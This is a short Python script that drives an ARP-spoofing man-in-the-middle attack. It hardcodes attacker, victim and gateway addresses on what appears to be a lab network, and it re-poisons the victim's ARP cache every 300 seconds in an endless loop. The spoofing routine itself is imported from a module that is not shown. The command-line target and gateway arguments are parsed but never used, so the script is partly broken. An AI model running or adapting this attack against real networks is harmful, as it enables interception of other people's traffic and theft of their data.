from ARP import ARP
from classes.User import User
import time
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Code to handle if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Code to handle if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def ARPSpoof(n_times = 0):
    attacker = User('192.168.56.103')
    attacker.get_mac()
    victim = User('192.168.56.101')
    victim.get_mac()
    arp = ARP(attacker, victim, '192.168.56.102')
    if n_times <= 0:
        while True:
            arp.spoof(mitm=True)
            time.sleep(300)
    else:
        arp.spoof()


if __name__ == '__main__':
    options = get_args()
    target_ip = options.target_ip
    gateway_ip = options.gateway_ip
    ARPSpoof()